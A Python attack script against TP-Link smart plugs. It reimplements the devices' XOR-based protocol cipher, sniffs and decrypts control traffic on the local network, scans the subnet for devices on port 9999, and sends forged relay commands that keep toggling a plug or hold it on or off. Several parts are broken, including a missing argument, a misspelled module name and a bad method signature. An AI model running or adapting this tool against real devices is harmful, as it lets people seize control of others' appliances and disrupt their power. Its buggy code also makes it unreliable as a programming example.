#!/usr/bin/env python3

from scapy.all import *
from binascii import unhexlify
from time import sleep
import nmap3
import socket
import os
import signal
import sys
import threading

class Spinner:
  busy = False
  delay = 0.1

  @staticmethod
  def spinning_cursor():
    while True:
      for cursor in '|/-\\':
        yield cursor

  def __init__(self):
    self.spinner = self.spinning_cursor()

  def spinner_task(self):
    while self.busy:
      sys.stdout.write(next(self.spinner))
      sys.stdout.flush()
      sleep(self.delay)
      sys.stdout.write('\b')
      sys.stdout.flush()

  def __enter__(self):
    self.busy = True
    self.t = threading.Thread(target=self.spinner_task)
    self.t.start()

  def __exit__(self, exception, value, tb):
    self.busy=False
    self.t.join()
    if exception is not None:
      return False


class TP_Link_Attack():
  victim_port = 9999
  victim_id = "ffffffff-ffff-ffff-ffff-ffffffffffff"
  iface= None
  on_cmd = None
  off_cmd = None
  repeat = False


  # @param iface  Network interface of attacker.
  def __init__(self, iface):
    self.iface = iface
    self.on_cmd = self.construct_switch_cmd(on=True)
    self.off_cmd = self.construct_switch_cmd(on=False)

    signal.signal(signal.SIGINT, self.signal_handler)
    

  def signal_handler(self, sig, frame):
    self.repeat = False


  # Given a plaintext, encrypt it so it can be accepted by the device
  @staticmethod
  def encrypt(plaintext, initial="00000066"):
    iv = 171
    ciphertext = initial

    for i in range(0, len(plaintext)):
      ciphertext += format((ord(plaintext[i]) ^ iv), 'x')
      iv = ord(plaintext[i]) ^ iv

    return ciphertext


  # Given a ciphertext (related to the device; we aren't qualified to crack AES), return a decoded string
  @staticmethod
  def decrypt(ciphertext):
    iv = 171
    plaintext = ""

    if (len(ciphertext) <= 8):
      return plaintext

    for i in range(8, len(ciphertext), 2):
      plaintext += chr(int(ciphertext[i:(i+2)], 16) ^ iv)
      iv = int(ciphertext[i:(i+2)], 16)

    return plaintext


  # Constructs a valid switch JSON command. 
  def construct_switch_cmd(self, on=False):
    return "{\"context\":{\"source\":\"" + \
        self.victim_id + \
        "\"},\"system\":{\"set_relay_state\":{\"state\":" + \
        str(int(on)) + \
        "}}}"

  
  # Sends to the victim the binary representation of the provided JSON command
  # NOTE: Uses only one TCP session to send JSON
  def send_json(self, ip, json, timeout=2):
    self.send_single_payload(ip, unhexlify(self.encrypt(json)), timeout)


  # Establishes a TCP connection with the victim and sends the payload
  # After the payload has been sent, terminate the current TCP session
  # NOTE: Ensure 'payload' is binary data
  def send_single_payload(self, ip, payload, timeout=2):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.connect((ip, self.victim_port))
      ss = StreamSocket(s)

      #ss.send(Raw(payload))

      # Get status report
      #pkt = ss.sniff(iface=self.iface, timeout=timeout, count=1, filter="tcp[tcpflags] & tcp-push != 0")

      pkt = ss.sr1(Raw(payload), iface=self.iface, timeout=timeout, filter="tcp[tcpflags] & tcp-push != 0")

    return pkt

 
  # sniffs and decrypts packets coming to and from controlling devices on the subnet
  # NOTE: Does NOT decrypt TLS streams from remote server to TP_LINK device 
  def sniff_and_decrypt(self, ip):
    # PSH = 0x08
    custom_filter = lambda pkt: pkt.haslayer(IP) and pkt.haslayer(TCP) and \
        ((pkt[IP].dst == ip and pkt[TCP].dport == self.victim_port and pkt[TCP].flags & 0x08) or \
        (pkt[IP].src == ip and pkt[TCP].sport == self.victim_port and pkt[TCP].flags & 0x08))
    printer = lambda pkt: pkt[IP].src + " -> " + pkt[IP].dst + "\n" + self.decrypt(raw(pkt[Raw]).hex()) + "\n"

    sniff(iface=self.iface, lfilter=custom_filter, prn=printer)

    print("\nSniffing stopped...\n")


  # After 'delay' seconds, send a command that toggles the device
  # (on -> off -> on -> off ...) 
  # Continious mode: more stable and faster; uses one continious TCP session with the victim
  def alternating_attack(self, ip, delay=0.5, continious=True):
    toggle = False
    self.repeat = True

    print("Starting alternating attack...")
    
    with Spinner():
      # Use multiple TCP connections to execute the attack
      if not continious:
        while self.repeat:
          if toggle:
            self.send_json(self.on_cmd)
          else:
            self.send_json(self.off_cmd)
          toggle = not toggle

          sleep(delay)
      else:
        # Use one continious TCP session to execute the attack
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.connect((ip, self.victim_port))
          ss = StreamSocket(s)
          while self.repeat:
            if toggle:
              ss.send(Raw(unhexlify(self.encrypt(self.on_cmd))))
            else:
              ss.send(Raw(unhexlify(self.encrypt(self.off_cmd))))
            toggle = not toggle 

            # capture status report from device
            # RST from device if not used
            ss.sniff(iface=self.iface, count=1, filter="tcp[tcpflags] & tcp-push != 0")
            sleep(delay)

    print("\nAlternating attack stopped")


  
  # Send commands to the device that makes it maintain its state.
  # Continious mode: uses one continious TCP connection and sends a command every $delay seconds.
  # Non-continious mode: wait to resend command when activity happens with device (e.g. notifying app)
  # NOTE: Non-continious mode may not work if no internet, no app on subnet and device has been manually switched
  def always_attack(self, ip, on=False, continious=False, delay=0.5):
    # True if packets are related to the victim and that a FIN flag exists (TCP)
    # Helps prevent flooding the network
    fin_filter = lambda pkt: pkt.haslayer(IP) and \
        (pkt[IP].dst == ip or pkt[IP].src == ip) and \
        (pkt[IP].dst != get_if_addr(self.iface) or pkt[IP].src != get_if_addr(self.iface)) and \
        pkt.haslayer(TCP) and (pkt[TCP].flags & 0x01)

    self.repeat = True

    print("Starting always attack...")

    with Spinner():
      if not continious:
        while self.repeat:
          if on:
            self.send_json(self.on_cmd)
          else:
            self.send_json(self.off_cmd)

          # Wait until someone turned it on or off
          sniff(iface=self.iface, count=1, timeout=delay, lfilter=fin_filter)
      else:
        # Use one continious TCP session to execute the attack
        # Sends (on/off) cmd every 0.5 seconds
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.connect((ip, self.victim_port))
          ss = StreamSocket(s)
          while self.repeat:
            if on:
              ss.send(Raw(unhexlify(self.encrypt(self.on_cmd))))
            else:
              ss.send(Raw(unhexlify(self.encrypt(self.off_cmd))))

            # capture status report from device
            # RST from device if not used
            ss.sniff(iface=self.iface, count=1, filter="tcp[tcpflags] & tcp-push != 0")
            sleep(delay)

    print("\nAlternating attack stopped")

 
  # performs a SYN scan (ASSUMING A /24 SUBNET) to try and find the device
  def find_ip(self):
    nmap = nmap3.Nmap()
    potential_ips = []

    print("Scanning for potential devices...")
    with Spinner():
      hosts = nmap.scan_command(target=get_if_addr(self.iface)+"/24", arg="-sn")
      for host in hosts.findall("host"):
        port_scan = nmap.scan_command(target=host.find("address").get("addr"), arg="-sS -p "+str(self.victim_port))
        if port_scan.find("host").find("ports").find("port").find("state").get("state") == "open":
          potential_ips.append(host.find("address").get("addr"))

    print("Potential devices found:", potential_ips)
    print("\nTesting devices...")
    with Spinner():
      for ip in potential_ips:
        with socket.socket(socekt.AF_INET, socket.SOCK_STREAM) as s:
          s.connect((ip, self.victim_port))
          ss = StreamSocket(s)
          #reply = ss.sr1(self.on_cmd, iface=self.iface, filter="tcp[tcpflags] & tcp-push != 0")
      pass


  def __enter__(self):
    pass

  
  def __exit__(self):
    pass



if __name__=="__main__":
  os.system('clear')
  test = TP_Link_Attack("wlan0")


